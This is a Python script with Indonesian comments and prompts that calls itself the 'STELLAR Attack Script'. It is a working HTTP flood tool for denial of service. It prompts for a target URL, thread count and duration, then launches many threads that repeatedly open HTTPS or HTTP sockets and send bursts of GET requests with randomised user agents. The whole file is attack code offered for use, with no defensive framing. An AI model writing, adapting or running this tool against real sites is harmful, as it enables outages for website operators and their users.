import os
import subprocess
import sys
import threading
import socket
import ssl
import random
import time
import datetime
from urllib.parse import urlparse
from sys import stdout
from rich.console import Console
from rich.panel import Panel
from colorama import init  # Tambahkan ini untuk colorama

# Daftar modul yang diperlukan
required_modules = [
    "requests",
    "colorama",
    "rich",
    "beautifulsoup4"
]

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            print(f"Modul '{module}' tidak ditemukan. Menginstal...")
            install(module)

# Panggil fungsi untuk memeriksa dan menginstal modul
check_and_install_modules()

# Banner and console setup
console = Console()

# Colors
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING

# Clear console
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Load user-agent dari file ua.txt
def load_user_agents():
    try:
        with open('ua.txt', 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        console.print(Panel(f"{M2}File ua.txt tidak ditemukan. Pastikan file tersebut ada di direktori yang sama.", style="bold red"))
        sys.exit(1)

# Main command function
def command():
    try:
        # Panel for user input
        console.print(Panel("[bold green]Serangan STELLAR Dimulai![/bold green]"))
        
        target = console.input(f'{H2}• {K2}Masukkan URL Target: {H2}')
        thread = int(console.input(f'{H2}• {K2}Jumlah Thread: {H2}'))
        t = int(console.input(f'{H2}• {K2}Durasi Serangan (detik): {H2}'))
        
        # Validate inputs
        if not target or thread <= 0 or t <= 0:
            console.print(Panel(f"{M2}Input tidak valid, coba lagi.", style="bold red"))
            return

        # Panel showing attack details
        attack_panel = Panel(f"[bold cyan]Target: {target}[/bold cyan]\n"
                             f"[bold yellow]Jumlah Thread: {thread}[/bold yellow]\n"
                             f"[bold magenta]Durasi: {t} detik[/bold magenta]",
                             title="[bold green]Detail Serangan[/bold green]",
                             border_style="green")
        console.print(attack_panel)
        
        # Start attack and countdown
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        countdown_thread = threading.Thread(target=countdown, args=(t,))
        countdown_thread.start()
        countdown_thread.join()
    except ValueError:
        console.print(Panel(f"{M2}Input angka tidak valid.", style="bold red"))

# Attack function
def attackSTELLAR(url, timer, threads):
    for _ in range(threads):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

# Attack process
def LaunchSTELLAR(url, timer):
    end_time = time.time() + timer
    user_agents = load_user_agents()  # Load user agents from ua.txt
    req_template = (
        "GET / HTTP/1.1\r\nHost: {host}\r\n"
        "Cache-Control: no-cache\r\n"
        "User-Agent: {ua}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Sec-Fetch-Site: same-origin\r\n"
        "Sec-GPC: 1\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Connection: Keep-Alive\r\n\r\n"
    )

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host = urlparse(url).netloc

            # Coba koneksi HTTPS (port 443)
            try:
                s.connect((host, 443))
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=host)
            except Exception:
                # Jika HTTPS gagal, coba HTTP (port 80)
                console.print(Panel(f"{K2}Gagal koneksi HTTPS, mencoba HTTP...", style="bold yellow"))
                s.connect((host, 80))

            # Siapkan request dengan user-agent acak
            req = req_template.format(host=host, ua=random.choice(user_agents))
            s.send(req.encode())

            try:
                for _ in range(100):
                    s.send(req.encode())
                time.sleep(0.1)  # Menambahkan jeda antara permintaan
            except Exception as e:
                console.print(Panel(f"Terjadi kesalahan saat mengirim permintaan: {e}", style="bold red"))
            finally:
                s.close()
        except Exception as e:
            console.print(Panel(f"Kesalahan koneksi: {e}", style="bold red"))
            time.sleep(1)  # Menambahkan jeda sebelum mencoba lagi

# Countdown function
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=t)
    while True:
        remaining_time = (until - datetime.datetime.now()).total_seconds()
        if remaining_time > 0:
            stdout.flush()
            console.print(f"Status serangan => {remaining_time:.2f} detik tersisa", end="\r")
        else:
            stdout.flush()
            console.print(Panel("[bold green]Serangan selesai![/bold green]", style="green"))
            return

# Entry point
if __name__ == '__main__':
    init(convert=True)  # Menggunakan colorama untuk konversi warna di terminal
    clear()
    console.print(Panel("[bold cyan]Selamat Datang di STELLAR Attack Script[/bold cyan]", style="bold cyan"))
    while True:
        command()
